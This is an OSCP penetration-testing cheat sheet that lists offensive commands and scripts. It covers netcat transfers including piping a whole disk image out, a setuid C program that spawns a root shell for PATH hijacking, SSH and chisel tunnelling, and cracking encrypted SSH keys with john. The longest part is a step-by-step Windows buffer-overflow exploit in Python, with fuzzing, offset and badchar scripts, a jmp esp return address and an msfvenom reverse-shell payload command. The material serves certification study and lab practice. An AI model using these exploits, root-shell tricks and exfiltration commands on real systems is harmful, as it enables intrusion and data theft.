# OSCP_Cheat_sheet


## Information Gathering

1. DNS Zone Transfer
- nslookup
  `set type=a,cname,ns,mx`
  `server <domainorIP>`
- dig
  `dig axfr domain @IP` 

## Post Exploitation
1. Sending Files
- nc 
```
Simple File Transfer
To receive:
nc -l 9999 > fromMac.file
 
To send:
nc 172.20.1.168 9999 < toLinux.file
	 
With Compression
To receive:
nc -l -p 1234 | uncompress -c | tar xvfp -

To send:
tar cfp - /some/dir | compress -c | nc -w 3 [destination] 1234
 
 
Transfer of whole hard drive:
To send:
dd if=/dev/hda3 | gzip -9 | nc -l 3333
To receive:
nc \[destination\] 3333 | pv -b > hdImage.img.gz
 
```

2. Path Hijacking
- Create a program or script 

```
// gcc -o /tmp/rootshell /tmp/rootshell.c
// chmod u+s /tmp/rootshell
#include <stdio.h\>
#include <sys/types.h\>
#include <unistd.h\>
int main(void)
{
setuid(0); setgid(0); system("/bin/bash");
}

echo "/bin/sh" > <program>
chmod 777 <program>
```
- Export the path of the malicious program
`export PATH=/tmp:$PATH`

- Run the suid binary and gain root


## Privilege Escalation

1. Port-Forwarding or SSH Tunneling

 a. ./chisel client 10.10.14.21:8080 R:631:127.0.0.1:631 -- target machine

    ./chisel server --reverse -- host machine
    
 b. ssh user@ip -D 1080 -- forward all traffics on localhost port 1080

    edit /etc/proxychains.conf, add SOCKS 127.0.0.1 1080 

    ssh user@ip -L xxxx.127.0.0.1:xxxx 

    proxychains <command>

 c. 

 2. Attach tmux session

  /usr/bin/tmux -S /.devs/dev_sess

 3. Decrypt id_rsa key with password

   /usr/share/john/ssh2john.py id_rsa.encrypted > id_rsa_ssh2john

   john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_ssh2john

   openssl rsa -in hype_key_encrypted -out hype_key_decrypted

 4. Finding SUID binaries

   find / -perm -4000 2>/dev/null

## Buffer Overflow - Windows

1. Set working folder for mona.

**!mona config -set workingfolder c:\mona\%p**
  
2. Fuzz number of bytes until application crashed.

import socket, time, sys

ip = ""
port = 
timeout = 5

buffer = [] 
counter = 100
while len(buffer) < 30:
    buffer.append(b"A" * counter)
    counter += 100

for string in buffer:
   try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.settimeout(timeout)
      connect = s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with %s bytes" % len(string))
      s.send(b"OVERFLOW1 " + string + b"\r\n")
      s.recv(1024)
      s.close()

   except:
      print("Could not connect to " + ip + ":" + str(port))
      sys.exit(0)
   time.sleep(1) 

3. Control EIP, create a pattern and determine the offset. Add 400 bytes on the crashed bytes.

**/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600**

import socket

ip = ""
port = 

prefix = b"OVERFLOW1 "
offset = 0
overflow = b"A" * offset
retn = b""
padding = b""
payload = b""
postfix = b""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(buffer + b"\r\n")
    print("Done!")
except:
    print("Could not connect.")

**/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 600 -q **


!mona findmsp -distance <numberofbytescreated>

4. Determine badchars. Create \x00 to \xff and look for missing character.
  **Note: Remember that badchars can affect the next byte as well!**

**!mona bytearray -b "\x00"**


import socket

ip = ""
port = 

prefix = b"OVERFLOW1 "
offset = 0
overflow = b"A" * offset + b"B" * 4
badchars =(
b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
retn = b""
padding = b""
payload = b""
postfix = b"C" * (<numberofbytes>-(offset+4+len(badchars)))

buffer = prefix + overflow + badchars + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(buffer + b"\r\n")
    print("Done!")
except:
    print("Could not connect.")


**!mona compare -f C:\mona\oscp\bytearray.bin -a**

5. Search for jmp esp avoiding the badchars.

**!mona jmp -r esp -cpb "\x00"**

6. Create your payload using msfvenom.

import socket
import struct

ip = "10.10.70.219"
port = 1337

prefix = b"OVERFLOW7 "
offset = 1306
#390-dummy 
overflow = b"A" * offset 
#0x625011af : jmp esp   
retn = struct.pack("I",0x625011af)
padding = b"\x90"*21
payload = b""
postfix = b"C" * (<numberofbytes>-(offset+4+len(payload+padding)))

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(buffer + b"\r\n")
    print("Done!")
except:
    print("Could not connect.")


**msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "\x00" -f py**  

   
